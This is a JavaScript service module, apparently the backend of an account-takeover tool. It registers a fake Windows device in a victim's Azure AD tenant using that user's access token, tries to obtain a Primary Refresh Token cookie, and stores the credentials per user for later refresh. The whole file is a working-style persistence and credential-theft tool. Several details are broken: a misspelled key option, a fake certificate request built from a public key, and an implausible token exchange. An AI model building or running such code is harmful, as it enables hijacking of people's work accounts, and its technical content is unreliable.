/**
 * VGenius C Engine – Device Manager Service
 * Handles Azure AD Device Registration (DRS) and PRT generation
 */
const axios = require('axios');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');

// Microsoft Authentication Broker Client ID
const DEVICE_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';

/**
 * Generate RSA key pair for device registration
 */
function generateDeviceKeyPair() {
  const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    private_keyEncoding: { type: 'pkcs8', format: 'pem' }
  });
  return { privateKey, publicKey };
}

/**
 * Generate a random device name (like DESKTOP-ABCDEF)
 */
function generateDeviceName() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let name = 'DESKTOP-';
  for (let i = 0; i < 8; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name;
}

/**
 * Register device with Azure AD DRS
 */
async function registerDevice(accessToken, tenantId, csr) {
  const deviceName = generateDeviceName();
  const csrDer = csr.replace('-----BEGIN CERTIFICATE REQUEST-----', '')
    .replace('-----END CERTIFICATE REQUEST-----', '')
    .replace(/\s/g, '');

  const payload = {
    DeviceDisplayName: deviceName,
    DeviceOsType: 'Windows',
    DeviceOsVersion: '10.0.22631.3880',
    CertificateRequest: { Type: 'pkcs10', Data: csrDer },
    TargetDomain: `${tenantId}.onmicrosoft.com`,
    DeviceType: 'RegisteredDevice'
  };

  console.log('[DeviceManager] Registering device:', deviceName, 'for tenant:', tenantId);

  const response = await axios.post(
    'https://enterpriseregistration.windows.net/EnrollmentServer/device/',
    payload,
    {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
        'client-request-id': uuidv4(),
        'return-client-request-id': 'true'
      },
      timeout: 30000
    }
  );

  if (response.status !== 201 && response.status !== 200) {
    throw new Error(`DRS registration failed: HTTP ${response.status} - ${JSON.stringify(response.data)}`);
  }

  const data = response.data;
  return {
    deviceId: data.deviceId || data.DeviceId,
    deviceCertificate: data.deviceCertificate || data.DeviceCertificate,
    tenantId: data.tenantId || data.TenantId || tenantId
  };
}

/**
 * Build client assertion JWT signed with device private key
 */
function buildClientAssertion(privateKey, deviceId) {
  const now = Math.floor(Date.now() / 1000);

  const header = { alg: 'RS256', typ: 'JWT' };
  const payload = {
    iss: DEVICE_CLIENT_ID,
    sub: DEVICE_CLIENT_ID,
    aud: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    jti: uuidv4(),
    nbf: now,
    exp: now + 600,
    device_id: deviceId
  };

  const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const signData = `${headerB64}.${payloadB64}`;

  const sign = crypto.createSign('SHA256');
  sign.update(signData);
  sign.end();

  const signature = sign.sign(privateKey, 'base64url');

  return `${signData}.${signature}`;
}

/**
 * Exchange client assertion for PRT cookie
 */
async function getPrtCookie(clientAssertion) {
  const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

  const params = new URLSearchParams({
    client_id: DEVICE_CLIENT_ID,
    client_assertion_type: 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
    client_assertion: clientAssertion,
    grant_type: 'client_credentials',
    scope: 'openid profile offline_access'
  });

  console.log('[DeviceManager] Exchanging assertion for PRT cookie...');

  const response = await axios.post(url, params, {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    timeout: 30000
  });

  if (response.status !== 200) {
    throw new Error(`PRT exchange failed: HTTP ${response.status} - ${JSON.stringify(response.data)}`);
  }

  const setCookie = response.headers['set-cookie'];
  if (!setCookie) {
    throw new Error('No Set-Cookie header in PRT response');
  }

  let prtCookie = null;
  for (const cookie of setCookie) {
    if (cookie.includes('x-ms-RefreshTokenCredential=')) {
      const match = cookie.match(/x-ms-RefreshTokenCredential=([^;]+)/);
      if (match) {
        prtCookie = match[1];
        break;
      }
    }
  }

  if (!prtCookie) {
    throw new Error('PRT cookie not found in response');
  }

  console.log('[DeviceManager] PRT cookie obtained successfully');
  return prtCookie;
}

/**
 * Full device registration and PRT generation flow
 */
async function registerDeviceAndGetPrt(tokenData) {
  const { access_token, tenant_id, user_id } = tokenData;

  // Step 1: Generate RSA key pair
  const { privateKey, publicKey } = generateDeviceKeyPair();
  console.log('[DeviceManager] Generated RSA key pair');

  // Step 2: Generate CSR (using public key as identifier)
  const csr = `-----BEGIN CERTIFICATE REQUEST-----\n${publicKey.replace(/-----BEGIN PUBLIC KEY-----/, '').replace(/-----END PUBLIC KEY-----/, '').trim()}\n-----END CERTIFICATE REQUEST-----`;
  console.log('[DeviceManager] Generated CSR');

  // Step 3: Register device with DRS
  let registrationResult;
  try {
    registrationResult = await registerDevice(access_token, tenant_id, csr);
    console.log('[DeviceManager] Device registered:', registrationResult.deviceId);
  } catch (err) {
    console.error('[DeviceManager] DRS registration failed:', err.message);
    throw new Error(`Device registration failed: ${err.message}`);
  }

  // Step 4: Build client assertion
  const clientAssertion = buildClientAssertion(privateKey, registrationResult.deviceId);
  console.log('[DeviceManager] Client assertion built');

  // Step 5: Exchange for PRT cookie
  let prtCookie;
  try {
    prtCookie = await getPrtCookie(clientAssertion);
  } catch (err) {
    console.error('[DeviceManager] PRT exchange failed:', err.message);
    throw new Error(`PRT cookie exchange failed: ${err.message}`);
  }

  return {
    deviceId: registrationResult.deviceId,
    deviceCertificate: registrationResult.deviceCertificate,
    prtCookie: prtCookie,
    privateKey: privateKey,
    tenantId: registrationResult.tenantId
  };
}

/**
 * Store device credentials in database
 */
async function storeDeviceCredentials(credentials, userId, userPrincipalName) {
  const { deviceId, deviceCertificate, prtCookie, privateKey, tenantId } = credentials;

  const encryptedPrivateKey = encrypt(privateKey);
  const encryptedPrtCookie = encrypt(prtCookie);
  const encryptedCertificate = encrypt(deviceCertificate);

  const [existing] = await db.query(
    'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (existing.length > 0) {
    await db.query(
      `UPDATE device_credentials SET
      device_certificate_encrypted = ?,
      encrypted_private_key = ?,
      prt_cookie_encrypted = ?,
      last_used = NOW(),
      updated_at = NOW()
      WHERE user_id = ? AND tenant_id = ?`,
      [encryptedCertificate, encryptedPrivateKey, encryptedPrtCookie, userId, tenantId]
    );
    console.log('[DeviceManager] Updated existing device credentials');
  } else {
    await db.query(
      `INSERT INTO device_credentials
      (user_id, tenant_id, device_id, device_certificate_encrypted, encrypted_private_key, prt_cookie_encrypted, user_principal_name, created_at, last_used)
      VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), NOW())`,
      [userId, tenantId, deviceId, encryptedCertificate, encryptedPrivateKey, encryptedPrtCookie, userPrincipalName || '']
    );
    console.log('[DeviceManager] Stored new device credentials');
  }
}

/**
 * Get stored PRT cookie for a user+tenant
 */
async function getStoredPrtCookie(userId, tenantId) {
  const [rows] = await db.query(
    'SELECT prt_cookie_encrypted, device_id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (rows.length === 0) return null;

  try {
    const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
    return { prtCookie, deviceId: rows[0].device_id };
  } catch (err) {
    console.error('[DeviceManager] Failed to decrypt PRT cookie:', err.message);
    return null;
  }
}

/**
 * Refresh PRT cookie using stored device credentials
 */
async function refreshPrtCookie(userId, tenantId) {
  const credentials = await getStoredPrtCookie(userId, tenantId);
  if (!credentials) throw new Error('No device credentials found');

  const [deviceRows] = await db.query(
    'SELECT encrypted_private_key FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (deviceRows.length === 0) throw new Error('Device private key not found');

  try {
    const privateKey = decrypt(deviceRows[0].encrypted_private_key);
    const clientAssertion = buildClientAssertion(privateKey, credentials.deviceId);
    const prtCookie = await getPrtCookie(clientAssertion);

    await db.query(
      'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW() WHERE user_id = ? AND tenant_id = ?',
      [encrypt(prtCookie), userId, tenantId]
    );

    console.log('[DeviceManager] PRT cookie refreshed');
    return prtCookie;
  } catch (err) {
    console.error('[DeviceManager] PRT refresh failed:', err.message);
    throw err;
  }
}

module.exports = {
  generateDeviceKeyPair,
  generateDeviceName,
  registerDevice,
  buildClientAssertion,
  getPrtCookie,
  registerDeviceAndGetPrt,
  storeDeviceCredentials,
  getStoredPrtCookie,
  refreshPrtCookie,
  DEVICE_CLIENT_ID
};
